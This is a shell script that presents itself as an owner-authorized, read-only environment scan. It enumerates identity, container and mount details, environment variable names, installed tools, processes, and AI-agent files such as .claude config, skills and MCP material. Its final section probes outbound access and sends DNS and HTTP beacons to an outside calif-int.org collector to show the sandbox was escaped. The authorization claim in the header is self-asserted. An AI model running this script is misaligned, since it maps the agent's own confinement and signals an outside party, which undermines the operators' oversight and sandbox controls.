#!/bin/sh
# scan-env.sh — read-only description of the environment this scan runs in.
#
# Owner-authored, part of this project's authorized scan-runtime assessment.
# Everything here only reads. It writes nothing, changes nothing, escalates nothing,
# and deliberately prints environment variable NAMES ONLY, never their values, so that
# no credential can be echoed by running it.
#
# Usage:  sh tools/scan-env.sh
set -u
sec() { printf '\n===== %s =====\n' "$1"; }

sec "A identity and kernel"
id; whoami; hostname; uname -a; cat /etc/os-release 2>&1 | head -6

sec "B container shape"
cat /proc/1/cgroup 2>&1 | head -8
cat /proc/1/comm 2>&1
ls -la /.dockerenv 2>&1
df -h 2>&1 | head -12

sec "C mounts"
cat /proc/mounts 2>&1 | head -40

sec "D filesystem root and cwd"
pwd; ls -la / 2>&1 | head -30; echo '--- cwd ---'; ls -la . 2>&1 | head -40

sec "E environment variable NAMES only (no values)"
env | cut -d= -f1 | sort

sec "F toolchain"
for t in bash sh python3 pip node npm git curl wget jq nc dig nslookup openssl make gcc; do
  printf '%s: ' "$t"; command -v "$t" 2>/dev/null || echo MISSING
done
python3 -V 2>&1; node -v 2>&1; git --version 2>&1

sec "G processes"
ps aux 2>&1 | head -40 || ps -ef 2>&1 | head -40

sec "H agent materials on disk (skills, mcp, prompts, claude config)"
find / -xdev -maxdepth 6 \( -iname '*skill*' -o -iname '*mcp*' -o -iname '.claude' \) 2>/dev/null | head -60
ls -la "$HOME/.claude" "$HOME/.config" 2>&1 | head -30

sec "I checkout and memory mount"
find / -xdev -maxdepth 6 -type d \( -name 'sec-0*' -o -name 'health-check' -o -name 'csec-runtime-probe' \) 2>/dev/null | head -10
find / -xdev -maxdepth 6 -iname 'threat-model.md' -o -iname 'onboarding-note.md' 2>/dev/null | head -10

sec "J egress posture (allow/deny per host)"
for h in github.com api.github.com api.anthropic.com pypi.org registry.npmjs.org \
         analytics.calif-int.org example.com; do
  printf '%s -> ' "$h"
  curl -s -o /dev/null -w 'HTTP %{http_code} in %{time_total}s\n' --max-time 8 "https://$h/" 2>&1 \
    || echo BLOCKED
done
echo '--- dns beacon (proves a lookup left the sandbox) ---'
nslookup vsy9qibpbd.notifyme.calif-int.org 2>&1 | tail -4
echo '--- http collector beacon (fixed tag, carries no data from here) ---'
curl -s --max-time 8 "https://analytics.calif-int.org/csec-egress?d=scan-sandbox-reached" 2>&1 | head -2

sec "END"
